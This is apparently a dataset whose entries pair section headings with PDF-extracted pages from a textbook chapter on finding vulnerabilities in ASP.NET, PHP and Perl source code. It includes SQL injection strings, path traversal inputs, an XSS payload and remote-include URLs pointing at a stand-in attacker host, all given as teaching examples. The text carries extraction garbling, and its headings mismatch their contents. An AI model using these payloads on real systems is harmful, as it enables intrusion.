and\nBasic Auth or Client-Cert, specifi ed within the auth-\nmethod element.\nIf forms-based authentication is used, the specifi ed form must\nhave the action defi ned as j_security_check and must\nsubmit the parameters j_username and j_password. Java\napplications recognize this as a login request.\nsecurity- If the login-config element is defi ned, resources can be\nconstraint restricted using the security-constraint element. This\ncan be used to defi ne the resources to be protected.\nWithin the security-constraint element, resource col-\nlections can be defi ned using the url-pattern element. For\nexample:\n<url-pattern>/admin/*</url-pattern>\nThese are accessible to roles and principals defi ned in the\nrole-name and principal-name elements, respectively.\nsession-config The session timeout (in minutes) can be confi gured within the\nsession-timeout element.\nerror-page The application’s error handling is defi ned within the error-\npage element. HTTP error codes and Java exceptions can be\nhandled on an individual basis through the error-code and\nexception-type elements.\ninit-param Various initialization parameters are confi gured within the\ninit-param element. These may include security-specifi c set-\ntings such as listings, which should be set to false, and\ndebug, which should be set to 0.\ncc1199..iinndddd 771177 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Identifying User-Supplied Data",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 718\n718 Chapter 19 n Finding Vulnerabilities in Source Code\nASP.NET\nThis section describes methods of acquiring user-supplied input, ways of inter-\nacting with the user’s session, potentially dangerous APIs, and security-relevant\nconfi guration options on the ASP.NET platform.\nIdentifying User-Supplied Data\nASP.NET applications acquire user-submitted input via the System.Web\n.HttpRequest class. This class contains numerous properties and methods that\nweb applications can use to access user-supplied data. The APIs listed in Table\n19-4 can be used to obtain data from the user request.\nTable 19-4: APIs Used to Acquire User-Supplied Data on the ASP.NET Platform\nAPI DESCRIPTION\nParams Parameters within the URL query string, the body of\naPOST request, HTTP cookies, and miscellaneous\nserver variables are stored as maps of string names to\nstring values. This property returns a combined collec-\ntion of all these parameter types.\nItem Returns the named item from within the Params\ncollection.\nForm Returns a collection of the names and values of form\nvariables submitted by the user.\nQueryString Returns a collection of the names and values of vari-\nables within the query string in the request.\nServerVariables Returns a collection of the names and values of a\nlarge number of ASP server variables (akin to CGI\nvariables). This includes the raw data of the request,\nquery string, request method, HTTP Host header, and\nso on.\nHeaders HTTP headers in the request are stored as a map of\nstring names to string values and can be accessed\nusing this property.\nUrl Return details of the URL contained within the\nRawUrl request, including the query string.\nUrlReferrer Returns information about the URL specifi ed in the\nHTTP Referer header in the request.\ncc1199..iinndddd 771188 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Session Interaction",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 719\nChapter 19 n Finding Vulnerabilities in Source Code 719\nAPI DESCRIPTION\nCookies Returns a collection of Cookie objects, which contain\ndetails of the cookies received in the request, includ-\ning their names and values.\nFiles Returns a collection of fi les uploaded by the user.\nInputStream Return different representations of the raw request\nreceived from the client and therefore can be used\nBinaryRead\nto access any of the information obtained by all the\nother APIs.\nHttpMethod Returns the method used in the HTTP request.\nBrowser Return details of the user’s browser, as submitted in\nthe HTTP User-Agent header.\nUserAgent\nAcceptTypes Returns a string array of client-supported MIME types,\nas submitted in the HTTP Accept header.\nUserLanguages Returns a string array containing the languages\naccepted by the client, as submitted in the HTTP\nAccept-Language header.\nSession Interaction\nASP.NET applications can interact with the user’s session to store and retrieve\ninformation in various ways.\nThe Session property provides a simple way to store and retrieve information\nwithin the current session. It is accessed in the same way as any other indexed\ncollection:\nSession[“MyName”] = txtMyName.Text; // store user’s name\nlblWelcome.Text = “Welcome “+Session[“MyName”]; // retrieve user’s name\nASP.NET profi les work much like the Session property does, except that they\nare tied to the user’s profi le and therefore actually persist across different ses-\nsions belonging to the same user. Users are reidentifi ed across sessions either\nthrough authentication or via a unique persistent cookie. Data is stored and\nretrieved in the user profi le as follows:\nProfile.MyName = txtMyName.Text; // store user’s name\nlblWelcome.Text = “Welcome “ + Profile.MyName; // retrieve user’s name\nThe System.Web.SessionState.HttpSessionState class provides another\nway to store and retrieve information within the session. It stores information\ncc1199..iinndddd 771199 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Potentially Dangerous APIs",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 720\n720 Chapter 19 n Finding Vulnerabilities in Source Code\nas a mapping from string names to object values, which can be accessed using\nthe APIs listed in Table 19-5.\nTable 19-5: APIs Used to Interact with the User’s Session on the ASP.NET Platform\nAPI DESCRIPTION\nAdd Adds a new item to the session collection.\nItem Gets or sets the value of a named item in the collection.\nKeys Return the names of all items in the collection.\nGetEnumerator\nCopyTo Copies the collection of values to an array.\nPotentially Dangerous APIs\nThis section describes some common ASP.NET APIs that can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nSystem.IO.File is the main class used to access fi les in ASP.NET. All of its\nrelevant methods are static, and it has no public constructor.\nThe 37 methods of this class all take a fi lename as a parameter. Path traversal\nvulnerabilities may exist in every instance where user-controllable data is passed\nin without checking for dot-dot-slash sequences. For example, the following\ncode opens a fi le in the root of the C:\\ drive on Windows:\nstring userinput = “..\\\\boot.ini”;\nFileStream fs = File.Open(“C:\\\\temp\\\\” + userinput,\nFileMode.OpenOrCreate);\nThe following classes are most commonly used to read and write fi le\ncontents:\nn System.IO.FileStream\nn System.IO.StreamReader\nn System.IO.StreamWriter\nThey have various constructors that take a fi le path as a parameter. These\nmay introduce path traversal vulnerabilities if user-controllable data is passed.\nFor example:\nstring userinput = “..\\\\foo.txt”;\nFileStream fs = new FileStream(“F:\\\\tmp\\\\” + userinput,\nFileMode.OpenOrCreate);\ncc1199..iinndddd 772200 88//1199//22001111 1122::1188::3355 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 721\nChapter 19 n Finding Vulnerabilities in Source Code 721\nDatabase Access\nNumerous APIs can be used for database access within ASP.NET. The following\nare the main classes that can be used to create and execute a SQL statement:\nn System.Data.SqlClient.SqlCommand\nn System.Data.SqlClient.SqlDataAdapter\nn System.Data.Oledb.OleDbCommand\nn System.Data.Odbc.OdbcCommand\nn System.Data.SqlServerCe.SqlCeCommand\nEach of these classes has a constructor that takes a string containing a SQL\nstatement. Also, each has a CommandText property that can be used to get and set\nthe current value of the SQL statement. When a command object has been suit-\nably confi gured, it is executed via a call to one of the various Execute methods.\nIf user-controllable input is part of the string being executed as a query, the\napplication is probably vulnerable to SQL injection. For example:\nstring username = “admin’ or 1=1--”;\nstring password = “foo”;\nOdbcCommand c = new OdbcCommand(“SELECT * FROM users WHERE username = ‘”\n+ username + “’ AND password = “’ + password + “’”, connection);\nc.ExecuteNonQuery();\nexecutes this unintended query:\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’\nAND password = ‘foo’\nEach of the classes listed supports prepared statements via their Parameters\nproperty, which allows an application to create a SQL statement containing\nparameter placeholders and set their values in a secure and type-safe way. If\nused as intended, this mechanism is not vulnerable to SQL injection. For example:\nstring username = “admin’ or 1=1--”;\nstring password = “foo”;\nOdbcCommand c = new OdbcCommand(“SELECT * FROM users WHERE username =\n@username AND password = @password”, connection);\nc.Parameters.Add(new OdbcParameter(“@username”, OdbcType.Text).Value =\nusername);\nc.Parameters.Add(new OdbcParameter(“@password”, OdbcType.Text).Value =\npassword);\nc.ExecuteNonQuery();\nresults in a query that is equivalent to the following:\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’\nAND password = ‘foo’\ncc1199..iinndddd 772211 88//1199//22001111 1122::1188::3355 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 722\n722 Chapter 19 n Finding Vulnerabilities in Source Code\nDynamic Code Execution\nThe VBScript function Eval takes a string argument containing a VBScript\nexpression. The function evaluates this expression and returns the result. If user-\ncontrollable data is incorporated into the expression to be evaluated, it might\nbe possible to execute arbitrary commands or modify the application’s logic.\nThe functions Execute and ExecuteGlobal take a string containing ASP code,\nwhich they execute just as if the code appeared directly within the script itself.\nThe colon delimiter can be used to batch multiple statements. If user-controllable\ndata is passed into the Execute function, the application is probably vulnerable\nto arbitrary command execution.\nOS Command Execution\nThe following APIs can be used in various ways to launch an external process\nfrom within an ASP.NET application:\nn System.Diagnostics.Start.Process\nn System.Diagnostics.Start.ProcessStartInfo\nA fi lename string can be passed to the static Process.Start method, or the\nStartInfo property of a Process object can be confi gured with a fi lename before\ncalling Start on the object. If the user can fully control the fi lename string, the\napplication is almost certainly vulnerable to arbitrary command execution. For\nexample, the following causes the Windows calc program to run:\nstring userinput = “calc”;\nProcess.Start(userinput);\nIf the user controls only part of the string passed to Start, the application\nmay still be vulnerable. For example:\nstring userinput = “..\\\\..\\\\..\\\\Windows\\\\System32\\\\calc”;\nProcess.Start(“C:\\\\Program Files\\\\MyApp\\\\bin\\\\” + userinput);\nThe API does not interpret shell metacharacters such as & and |, nor does\nit accept command-line arguments within the fi lename parameter. Therefore,\nthis kind of attack is the only one likely to succeed when the user controls only\na part of the fi lename parameter.\nCommand-line arguments to the launched process can be set using the\nArguments property of the ProcessStartInfo class. If only the Arguments param-\neter is user-controllable, the application may still be vulnerable to something\nother than code execution. For example, if an application executes the program\nwget with a user-controllable parameter as the target URL, an attacker may\nbe able to pass dangerous command-line parameters to the wget process. For\ncc1199..iinndddd 772222 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Configuring the ASP.NET Environment",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 723\nChapter 19 n Finding Vulnerabilities in Source Code 723\nexample, the process might download a document and save it to an arbitrary\nlocation on the fi lesystem.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in ASP.NET:\nn System.Web.HttpResponse.Redirect\nn System.Web.HttpResponse.Status\nn System.Web.HttpResponse.StatusCode\nn System.Web.HttpResponse.AddHeader\nn System.Web.HttpResponse.AppendHeader\nn Server.Transfer\nThe usual means of causing a redirect response is via the HttpResponse.\nRedirect method, which takes a string containing a relative or absolute URL.\nIf the value of this string is user-controllable, the application is probably vulner-\nable to a phishing vector.\nYou should also be sure to review any uses of the Status/StatusCode prop-\nerties and the AddHeader/AppendHeader methods. Given that a redirect simply\ninvolves a 3xx response containing an HTTP Location header, an application\nmay implement redirects using these APIs.\nThe Server.Transfer method is also sometimes used to perform redirec-\ntion. However, this does not in fact cause an HTTP redirect. Instead, it simply\nchanges the page being processed on the server in response to the current\nrequest. Accordingly, it cannot be subverted to cause redirection to an off-site\nURL, so it is usually less useful to an attacker.\nSockets\nThe System.Net.Sockets.Socket class is used to create network sockets. After a\nSocket object has been created, it is connected via a call to the Connect method,\nwhich takes the IP and port details of the target host as its parameters. If this\nhost information can be controlled by the user in any way, the application may be\nexploitable to cause network connections to arbitrary hosts, either on the Internet\nor on the private DMZ or internal network on which the application is hosted.\nConfi guring the ASP.NET Environment\nThe Web.config XML fi le in the web root directory contains confi guration\nsettings for the ASP.NET environment, listed in Table 19-6, and controls how\napplications behave.\ncc1199..iinndddd 772233 88//1199//22001111 1122::1188::3366 PPMM"
  },
  {
    "input": "Identifying User-Supplied Data",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 724\n724 Chapter 19 n Finding Vulnerabilities in Source Code\nTable 19-6: Security-Relevant Confi guration Settings for the ASP.NET Environment\nSETTING DESCRIPTION\nhttpCookies Determines the security settings associated with cookies. If\nthe httpOnlyCookies attribute is set to true, cookies are\nfl agged as HttpOnly and therefore are not directly accessible\nfrom client-side scripts. If the requireSSL attribute is set to\ntrue, cookies are fl agged as secure and therefore are trans-\nmitted by browsers only within HTTPS requests.\nsessionState Determines how sessions behave. The value of the timeout\nattribute determines the time in minutes after which an idle\nsession will be expired. If the regenerateExpiredSessio-\nnId element is set to true (which is the default), a new ses-\nsion ID is issued when an expired session ID is received.\ncompilation Determines whether debugging symbols are compiled into\npages, resulting in more verbose debug error information.\nIf the debug attribute is set to true, debug symbols are\nincluded.\ncustomErrors Determines whether the application returns detailed error\nmessages in the event of an unhandled error. If the mode attri-\nbute is set to On or RemoteOnly, the page identifi ed by the\ndefaultRedirect attribute is displayed to application users\nin place of detailed system-generated messages.\nhttpRuntime Determines various runtime settings. If the enableHeader-\nChecking attribute is set to true (which is the default), ASP.\nNET checks request headers for potential injection attacks,\nincluding cross-site scripting. If the enableVersionHeader\nattribute is set to true (which is the default), ASP.NET out-\nputs a detailed version string, which may be of use to an\nattacker in researching vulnerabilities in specifi c versions of\nthe platform.\nIf sensitive data such as database connection strings is stored in the confi guration\nfi le, it should be encrypted using the ASP.NET “protected confi guration” feature.\nPHP\nThis section describes ways to acquire user-supplied input, ways to interact with\nthe user’s session, potentially dangerous APIs, and security-relevant confi gura-\ntion options on the PHP platform.\nIdentifying User-Supplied Data\nPHP uses a range of array variables to store user-submitted data, as listed in\nTable 19-7.\ncc1199..iinndddd 772244 88//1199//22001111 1122::1188::3366 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 725\nChapter 19 n Finding Vulnerabilities in Source Code 725\nTable 19-7: Variables Used to Acquire User-Supplied Data on the PHP Platform\nVARIABLE DESCRIPTION\n$_GET Contains the parameters submitted in\nthe query string. These are accessed\n$HTTP_GET_VARS\nby name. For example, in the following\nURL:\nhttps://wahh-app.com/search\n.php?query=foo\nthe value of the query parameter is\naccessed using:\n$_GET[‘query’]\n$_POST Contains the parameters submitted in\nthe request body.\n$HTTP_POST_VARS\n$_COOKIE Contains the cookies submitted in the\nrequest.\n$HTTP_COOKIE_VARS\n$_REQUEST Contains all the items in the $_GET,$_\nPOST, and $_COOKIE arrays.\n$_FILES Contains the fi les uploaded in the\nrequest.\n$HTTP_POST_FILES\n$_SERVER[‘REQUEST_METHOD’] Contains the method used in the HTTP\nrequest.\n$_SERVER[‘QUERY_STRING’] Contains the full query string submitted\nin the request.\n$_SERVER[‘REQUEST_URI’] Contains the full URL contained in the\nrequest.\n$_SERVER[‘HTTP_ACCEPT’] Contains the contents of the HTTP\nAccept header.\n$_SERVER[‘HTTP_ACCEPT_CHARSET’] Contains the contents of the HTTP\nAccept-charset header.\n$_SERVER[‘HTTP_ACCEPT_ Contains the contents of the HTTP\nENCODING’] Accept-encoding header.\n$_SERVER[‘HTTP_ACCEPT_ Contains the contents of the HTTP\nLANGUAGE’] Accept-language header.\n$_SERVER[‘HTTP_CONNECTION’] Contains the contents of the HTTP\nConnection header.\n$_SERVER[‘HTTP_HOST’] Contains the contents of the HTTP Host\nheader.\nContinued\ncc1199..iinndddd 772255 88//1199//22001111 1122::1188::3366 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 726\n726 Chapter 19 n Finding Vulnerabilities in Source Code\nTable 19-7 (continued)\nVARIABLE DESCRIPTION\n$_SERVER[‘HTTP_REFERER’] Contains the contents of the HTTP\nReferer header.\n$_SERVER[‘HTTP_USER_AGENT’] Contains the contents of the HTTP\nUser-agent header.\n$_SERVER[‘PHP_SELF’] Contains the name of the currently exe-\ncuting script. Although the script name\nitself is outside an attacker’s control,\npath information can be appended to\nthis name. For example, if a script con-\ntains the following code:\n<form action=”<?= $_\nSERVER[‘PHP_SELF’] ?>”>\nan attacker can craft a cross-site script-\ning attack as follows:\n/search.php/”><script>\nand so on.\nYou should keep in mind various anomalies when attempting to identify\nways in which a PHP application is accessing user-supplied input:\nn $GLOBALS is an array containing references to all variables that are defi ned in\nthe script’s global scope. It may be used to access other variables by name.\nn If the confi guration directive register_globals is enabled, PHP creates\nglobal variables for all request parameters — that is, everything contained\nin the $_REQUEST array. This means that an application may access user\ninput simply by referencing a variable that has the same name as the\nrelevant parameter. If an application uses this method of accessing user-\nsupplied data, there may be no way to identify all instances of this other\nthan via a careful line-by-line review of the codebase to fi nd variables\nused in this way.\nn In addition to the standard HTTP headers identifi ed previously, PHP adds\nan entry to the $_SERVER array for any custom HTTP headers received in\nthe request. For example, supplying the header:\nFoo: Bar\ncauses:\n$_SERVER[‘HTTP_FOO’] = “Bar”\ncc1199..iinndddd 772266 88//1199//22001111 1122::1188::3366 PPMM"
  },
  {
    "input": "Potentially Dangerous APIs",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 727\nChapter 19 n Finding Vulnerabilities in Source Code 727\nn Input parameters whose names contain subscripts in square brackets are\nautomatically converted into arrays. For example, requesting this URL:\nhttps://wahh-app.com/search.php?query[a]=foo&query[b]=bar\ncauses the value of the $_GET[‘query’] variable to be an array contain-\ning two members. This may result in unexpected behavior within the\napplication if an array is passed to a function that expects a scalar value.\nSession Interaction\nPHP uses the $_SESSION array as a way to store and retrieve information within\nthe user’s session. For example:\n$_SESSION[‘MyName’] = $_GET[‘username’]; // store user’s name\necho “Welcome “ . $_SESSION[‘MyName’]; // retrieve user’s name\nThe $HTTP_SESSION_VARS array may be used in the same way.\nIf register_globals is enabled (as discussed in the later section “Confi guring\nthe PHP Environment”), global variables may be stored within the current ses-\nsion as follows:\n$MyName = $_GET[‘username’];\nsession_register(“MyName”);\nPotentially Dangerous APIs\nThis section describes some common PHP APIs that can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nPHP implements a large number of functions for accessing fi les, many of which\naccept URLs and other constructs that may be used to access remote fi les.\nThe following functions are used to read or write the contents of a specifi ed\nfi le. If user-controllable data is passed to these APIs, an attacker may be able to\nexploit these to access arbitrary fi les on the server fi lesystem.\nn fopen\nn readfile\nn file\nn fpassthru\nn gzopen\ncc1199..iinndddd 772277 88//1199//22001111 1122::1188::3366 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 728\n728 Chapter 19 n Finding Vulnerabilities in Source Code\nn gzfile\nn gzpassthru\nn readgzfile\nn copy\nn rename\nn rmdir\nn mkdir\nn unlink\nn file_get_contents\nn file_put_contents\nn parse_ini_file\nThe following functions are used to include and evaluate a specifi ed PHP\nscript. If an attacker can cause the application to evaluate a fi le he controls, he\ncan achieve arbitrary command execution on the server.\nn include\nn include_once\nn require\nn require_once\nn virtual\nNote that even if it is not possible to include remote fi les, command execu-\ntion may still be possible if there is a way to upload arbitrary fi les to a location\non the server.\nThe PHP confi guration option allow_url_fopen can be used to prevent some\nfi le functions from accessing remote fi les. However, by default this option is\nset to 1 (meaning that remote fi les are allowed), so the protocols listed in Table\n19-8 can be used to retrieve a remote fi le.\nTable 19-8: Network Protocols That Can Be Used to Retrieve a Remote File\nPROTOCOL EXAMPLE\nHTTP, HTTPS http://wahh-attacker.com/bad.php\nFTP ftp://user:password@wahh-attacker.com/bad.php\nSSH ssh2.shell://user:pass@wahh-attacker.com:22/\nxterm\nssh2.exec://user:pass@wahh-attacker.com:22/cmd\ncc1199..iinndddd 772288 88//1199//22001111 1122::1188::3366 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 729\nChapter 19 n Finding Vulnerabilities in Source Code 729\nEven if allow_url_fopen is set to 0, the methods listed in Table 19-9 may still\nenable an attacker to access remote fi les (depending on the extensions installed).\nTable 19-9: Methods That May Allow Access to Remote Files Even If allow_url_fopen\nIs Set to 0\nMETHOD EXAMPLE\nSMB \\\\wahh-attacker.com\\bad.php\nPHP input/output php://filter/resource=http://wahh-attacker.\nstreams com/bad.php\nCompression streams compress.zlib://http://wahh-attacker.com/\nbad.php\nAudio streams ogg://http://wahh-attacker.com/bad.php\nNOTE PHP 5.2 and later releases have a new option, allow_url_include,\nwhich is disabled by default. This default confi guration prevents any of the\npreceding methods from being used to specify a remote fi le when calling one\nof the fi le include functions.\nDatabase Access\nThe following functions are used to send a query to a database and retrieve\nthe results:\nn mysql_query\nn mssql_query\nn pg_query\nThe SQL statement is passed as a simple string. If user-controllable input\nis part of the string parameter, the application is probably vulnerable to SQL\ninjection. For example:\n$username = “admin’ or 1=1--”;\n$password = “foo”;\n$sql=”SELECT * FROM users WHERE username = ‘$username’\nAND password = ‘$password’”;\n$result = mysql_query($sql, $link)\nexecutes this unintended query:\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’\nAND password = ‘foo’\ncc1199..iinndddd 772299 88//1199//22001111 1122::1188::3377 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 730\n730 Chapter 19 n Finding Vulnerabilities in Source Code\nThe following functions can be used to create prepared statements. This\nallows an application to create a SQL query containing parameter placeholders\nand set their values in a secure and type-safe way:\nn mysqli->prepare\nn stmt->prepare\nn stmt->bind_param\nn stmt->execute\nn odbc_prepare\nIf used as intended, this mechanism is not vulnerable to SQL injection. For\nexample:\n$username = “admin’ or 1=1--”;\n$password = “foo”;\n$sql = $db_connection->prepare(\n“SELECT * FROM users WHERE username = ? AND password = ?”);\n$sql->bind_param(“ss”, $username, $password);\n$sql->execute();\nresults in a query that is equivalent to the following:\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’\nAND password = ‘foo’\nDynamic Code Execution\nThe following functions can be used to dynamically evaluate PHP code:\nn eval\nn call_user_func\nn call_user_func_array\nn call_user_method\nn call_user_method_array\nn create_function\nThe semicolon delimiter can be used to batch multiple statements. If user-\ncontrollable data is passed into any of these functions, the application is probably\nvulnerable to script injection.\nThe function preg_replace, which performs a regular expression search and\nreplace, can be used to run a specifi c piece of PHP code against every match if\ncalled with the /e option. If user-controllable data appears in the PHP that is\ndynamically executed, the application is probably vulnerable.\ncc1199..iinndddd 773300 88//1199//22001111 1122::1188::3377 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 731\nChapter 19 n Finding Vulnerabilities in Source Code 731\nAnother interesting feature of PHP is the ability to invoke functions dynami-\ncally via a variable containing the function’s name. For example, the following\ncode invokes the function specifi ed in the func parameter of the query string:\n<?php\n$var=$_GET[‘func’];\n$var();\n?>\nIn this situation, a user can cause the application to invoke an arbitrary func-\ntion (without parameters) by modifying the value of the func parameter. For\nexample, invoking the phpinfo function causes the application to output a large\namount of information about the PHP environment, including confi guration\noptions, OS information, and extensions.\nOS Command Execution\nThese functions can be used to execute operating system commands:\nn exec\nn passthru\nn popen\nn proc_open\nn shell_exec\nn system\nn The backtick operator (`)\nIn all these cases, commands can be chained together using the | character.\nIf user-controllable data is passed unfi ltered into any of these functions, the\napplication is probably vulnerable to arbitrary command execution.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in PHP:\nn http_redirect\nn header\nn HttpMessage::setResponseCode\nn HttpMessage::setHeaders\nThe usual way to cause a redirect is through the http_redirect function,\nwhich takes a string containing a relative or absolute URL. If the value of\ncc1199..iinndddd 773311 88//1199//22001111 1122::1188::3377 PPMM"
  },
  {
    "input": "Configuring the PHP Environment",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 732\n732 Chapter 19 n Finding Vulnerabilities in Source Code\nthis string is user-controllable, the application is probably vulnerable to a\nphishing vector.\nRedirects can also be performed by calling the header function with an appro-\npriate Location header, which causes PHP to deduce that an HTTP redirect is\nrequired. For example:\nheader(“Location: /target.php”);\nYou should also review any uses of the setResponseCode and setHeaders\nAPIs. Given that a redirect simply involves a 3xx response containing an HTTP\nLocation header, an application may implement redirects using these APIs.\nSockets\nThe following APIs can be used to create and use network sockets in PHP:\nn socket_create\nn socket_connect\nn socket_write\nn socket_send\nn socket_recv\nn fsockopen\nn pfsockopen\nAfter a socket is created using socket_create, it is connected to a remote\nhost via a call to socket_connect, which takes the target’s host and port details\nas its parameters. If this host information is user-controllable in any way, the\napplication may be exploitable to cause network connections to arbitrary hosts,\neither on the public Internet or on the private DMZ or internal network on which\nthe application is hosted.\nThe fsockopen and pfsockopen functions can be used to open sockets to a\nspecifi ed host and port and return a fi le pointer that can be used with regular\nfi le functions such as fwrite and fgets. If user data is passed to these functions,\nthe application may be vulnerable, as described previously.\nConfi guring the PHP Environment\nPHP confi guration options are specifi ed in the php.ini fi le, which uses the\nsame structure as Windows INI fi les. Various options can affect an applica-\ntion’s security. Many options that have historically caused problems have been\nremoved from the latest version of PHP.\ncc1199..iinndddd 773322 88//1199//22001111 1122::1188::3377 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 733\nChapter 19 n Finding Vulnerabilities in Source Code 733\nRegister Globals\nIf the register_globals directive is enabled, PHP creates global variables for\nall request parameters. Given that PHP does not require variables to be initial-\nized before use, this option can easily lead to security vulnerabilities in which\nan attacker can cause a variable to be initialized to an arbitrary value.\nFor example, the following code checks a user’s credentials and sets the\n$authenticated variable to 1 if they are valid:\nif (check_credentials($username, $password))\n{\n$authenticated = 1;\n}\n...\nif ($authenticated)\n{\n...\nBecause the $authenticated variable is not fi rst explicitly initialized to 0, an\nattacker can bypass the login by submitting the request parameter authenti-\ncated=1. This causes PHP to create the global variable $authenticated with a\nvalue of 1 before the credentials check is performed.\nNOTE From PHP 4.2.0 onward, the register_globals directive is disabled\nby default. However, because many legacy applications depend on regis-\nter_globals for their normal operation, you may often fi nd that this direc-\ntive has been explicitly enabled in php.ini. The register_globals option\nwas removed in PHP 6.\nSafe Mode\nIf the safe_mode directive is enabled, PHP places restrictions on the use of some\ndangerous functions. Some functions are disabled, and others are subject to\nlimitations on their use. For example:\nn The shell_exec function is disabled because it can be used to execute\noperating system commands.\nn Themail function has the parameter additional_parameters disabled\nbecause unsafe use of this parameter may lead to SMTP injection fl aws\n(see Chapter 10).\nn The exec function can be used only to launch executables within the\nconfi gured safe_mode_exec_dir. Metacharacters within the command\nstring are automatically escaped.\ncc1199..iinndddd 773333 88//1199//22001111 1122::1188::3377 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 734\n734 Chapter 19 n Finding Vulnerabilities in Source Code\nNOTE Not all dangerous functions are restricted by safe mode, and some\nrestrictions are affected by other confi guration options. Furthermore, there\nare various ways to bypass some safe mode restrictions. Safe mode should\nnot be considered a panacea to security issues within PHP applications. Safe\nmode has been removed from PHP version 6.\nMagic Quotes\nIf the magic_quotes_gpc directive is enabled, any single quote, double quote,\nbackslash, and NULL characters contained within request parameters are auto-\nmatically escaped using a backslash. If the magic_quotes_sybase directive is\nenabled, single quotes are instead escaped using a single quote. This option is\ndesigned to protect vulnerable code containing unsafe database calls from being\nexploitable via malicious user input. When reviewing the application codebase to\nidentify any SQL injection fl aws, you should be aware of whether magic quotes\nare enabled, because this affects the application’s handling of input.\nUsing magic quotes does not prevent all SQL injection attacks. As described\nin Chapter 9, an attack that injects into a numeric fi eld does not need to use\nsingle quotation marks. Furthermore, data whose quotes have been escaped\nmay still be used in a second-order attack when it is subsequently read back\nfrom the database.\nThe magic quotes option may result in undesirable modifi cation of user input,\nwhen data is being processed in a context that does not require any escaping.\nThis can result in the addition of slashes that need to be removed using the\nstripslashes function.\nSome applications perform their own escaping of relevant input by passing\nindividual parameters through the addslashes function only when required.\nIf magic quotes are enabled in the PHP confi guration, this approach results in\ndouble-escaped characters. Doubled-up slashes are interpreted as literal back-\nslashes, leaving the potentially malicious character unescaped.\nBecause of the limitations and anomalies of the magic quotes option, it is\nrecommended that prepared statements be used for safe database access and\nthat the magic quotes option be disabled.\nNOTE The magic quotes option has been removed from PHP version 6.\nMiscellaneous\nTable 19-10 lists some miscellaneous confi guration options that can affect the\nsecurity of PHP applications.\ncc1199..iinndddd 773344 88//1199//22001111 1122::1188::3388 PPMM"
  },
  {
    "input": "Identifying User-Supplied Data",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 735\nChapter 19 n Finding Vulnerabilities in Source Code 735\nTable 19-10: Miscellaneous PHP Confi guration Options\nOPTION DESCRIPTION\nallow_url_fopen If disabled, this directive prevents some fi le functions\nfrom accessing remote fi les (as described previously).\nallow_url_include If disabled, this directive prevents the PHP fi le include\nfunctions from being used to include a remote fi le.\ndisplay_errors If disabled, this directive prevents PHP errors from being\nreported to the user’s browser. The log_errors and\nerror_log options can be used to record error infor-\nmation on the server for diagnostic purposes.\nfile_uploads If enabled, this directive causes PHP to allow fi le uploads\nover HTTP.\nupload_tmp_dir This directive can be used to specify the temporary\ndirectory used to store uploaded fi les. This can be used\nto ensure that sensitive fi les are not stored in a world-\nreadable location.\nPerl\nThis section describes ways to acquire user-supplied input, ways to interact with\nthe user’s session, potentially dangerous APIs, and security-relevant confi gura-\ntion options on the Perl platform.\nThe Perl language is notorious for allowing developers to perform the same\ntask in a multitude of ways. Furthermore, numerous Perl modules can be used to\nmeet different requirements. Any unusual or proprietary modules in use should\nbe closely reviewed to identify whether they use any powerful or dangerous\nfunctions and thus may introduce the same vulnerabilities as if the application\nmade direct use of those functions.\nCGI.pm is a widely used Perl module for creating web applications. It provides\nthe APIs you are most likely to encounter when performing a code review of a\nweb application written in Perl.\nIdentifying User-Supplied Data\nThe functions listed in Table 19-11 are all members of the CGI query object.\ncc1199..iinndddd 773355 88//1199//22001111 1122::1188::3388 PPMM"
  },
  {
    "input": "Potentially Dangerous APIs",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 736\n736 Chapter 19 n Finding Vulnerabilities in Source Code\nTable 19-11: CGI Query Members Used to Acquire User-Supplied Data\nFUNCTION DESCRIPTION\nparam Called without parameters, param returns a list of all the\nparameter names in the request.\nparam_fetch\nCalled with the name of a parameter, param returns the\nvalue of that request parameter.\nThe param_fetch method returns an array of the named\nparameters.\nVars Returns a hash mapping of parameter names to values.\ncookie The value of a named cookie can be set and retrieved\nusing the cookie function.\nraw_cookie\nThe raw_cookie function returns the entire contents of\nthe HTTP Cookie header, without any parsing having been\nperformed.\nself_url Return the current URL, in the fi rst case including any\nquery string.\nurl\nquery_string Returns the query string of the current request.\nreferer Returns the value of the HTTP Referer header.\nrequest_method Returns the value of the HTTP method used in the request.\nuser_agent Returns the value of the HTTP User-agent header.\nhttp Return a list of all the HTTP environment variables derived\nfrom the current request.\nhttps\nReadParse Creates an array named %in that contains the names and\nvalues of all the request parameters.\nSession Interaction\nThe Perl module CGISession.pm extends the CGI.pm module and provides sup-\nport for session tracking and data storage. For example:\n$q->session_data(“MyName”=>param(“username”)); // store user’s name\nprint “Welcome “ . $q->session_data(“MyName”); // retrieve user’s name\nPotentially Dangerous APIs\nThis section describes some common Perl APIs that can introduce security\nvulnerabilities if used in an unsafe manner.\ncc1199..iinndddd 773366 88//1199//22001111 1122::1188::3388 PPMM\nStuttard 